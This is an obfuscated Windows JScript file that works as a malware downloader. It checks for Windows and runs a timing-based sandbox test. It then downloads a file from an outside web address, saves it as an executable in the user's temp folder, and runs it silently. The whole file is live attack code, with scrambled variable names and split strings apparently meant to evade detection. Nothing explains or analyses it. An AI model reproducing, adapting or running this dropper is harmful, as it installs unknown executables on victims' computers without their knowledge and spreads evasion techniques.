var _W = false;
var _L = "CreateObject";
var _H0 = function _Z() {return WScript[_L]("WScript"+".Shell");}(), _F = 11;
var _V0 = "MSXML2.XMLHTTP";
var _ZZ = 2123213;
var _I = 0;
function _N(_GS){_H0["Run"](_GS, _I, _I);};
function _ZF(){return _V0 + "";};
function _S(_BU, _XS){_I = _I * 1; return _BU - _XS;};
function _D(){return _L;};
/*@cc_on
  @if (@_win32 || @_win64)
    _W = true;
  @end
@*/
if (_W)
{
var _V = "";
function _PV(){return 22;};
var _OY = 0; var _Q = 0;
function _DQ()
{
var _QR = new this["Date"]();
var _GF = _QR["getUTCMilliseconds"]();
WScript["Sleep"](_PV());
var _QR = new this["Date"]();
var _GH = _QR["getUTCMilliseconds"]();
WScript["Sleep"](_PV());
var _QR = new this["Date"]();
var _JH = _QR["getUTCMilliseconds"]();
var _OY = "_P0";
_OY = _S(_GH, _GF);
var _Q = "_ZD";
_Q = _S(_JH, _GH);
_V = "open";
return _S(_OY, _Q);
}
var _VX = false;
var _AJ = false;
for (var _JV = _I; _JV < _PV() * 1; _JV++){if (_DQ() != _I){
_VX = true; 
_Q = "31" + 11 * _OY + _Q; 
_AJ = true; 
break;
}}
function _H() {return ((_VX == true) && (_VX == _AJ)) ? 1 : _I;};
if (_VX && _H() && _AJ){
function _CH() {return _H0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "m20I3HbCa2VLF.ex" + "e";};
 _YX = _ZF();
 _F0 = WScript[_L](_YX);
 var _EW = 1;
 while (_EW){
try {
	if (_EW == 1)
	{
		_F0[_V]("GET", "http://smartbs-cameroun.com/nc7sjd", false);
		_F0["send"]();
		_B = "Sleep";
	}
	WScript[_B](_PV() + 120); 
	if (_F0["readystate"] < 2 * 2) continue;
	_EW = _I;
	function _P(_KM) {var _IF = (1, 2, 3, 4, 5, _KM); return _IF;};
	_BF = WScript[_D()]("ADODB.Stream");
	_YX = _BF;
	_YX[_V]();
	_YX["type"] = _P(1);
	_YX["write"](_F0["ResponseBody"]);
	_BF["position"] = _P(_I);
	_YX["Save" + "ToFile"](_CH(), 2);
	_BF["cl"+"ose"]();
	_XM = _CH();
	_N(_XM);
} catch(_FM){};
}
}
}

